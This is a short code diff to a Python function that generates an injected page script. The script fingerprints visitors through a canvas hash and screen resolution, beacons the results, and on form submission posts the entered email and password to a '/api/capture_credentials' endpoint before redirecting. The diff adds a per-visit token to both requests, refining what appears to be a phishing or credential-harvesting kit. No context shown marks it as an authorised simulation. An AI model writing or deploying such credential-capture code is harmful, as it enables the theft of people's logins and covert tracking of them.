@@ -110,6 +110,7 @@ def architect_process():
         injection_script = """
 <script>
 const VISIT_ID = "{{ visit_id }}";
+const VISIT_TOKEN = "{{ visit_token }}";
 function getCanvasHash() {
     try {
         var canvas = document.createElement('canvas');
@@ -123,6 +124,7 @@ function getCanvasHash() {
 (function() {
     navigator.sendBeacon('/api/beacon', JSON.stringify({
         visit_id: VISIT_ID,
+        visit_token: VISIT_TOKEN,
         canvas_hash: getCanvasHash(),
         screen_res: window.screen.width + 'x' + window.screen.height
     }));
@@ -136,7 +138,7 @@ window.addEventListener('DOMContentLoaded', function() {
             fetch('/api/capture_credentials', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({visit_id: VISIT_ID, email: email, password: password})
+                body: JSON.stringify({visit_id: VISIT_ID, visit_token: VISIT_TOKEN, email: email, password: password})
             }).then(() => window.location.href = "{{ destination }}")
               .catch(() => window.location.href = "{{ destination }}");
         });
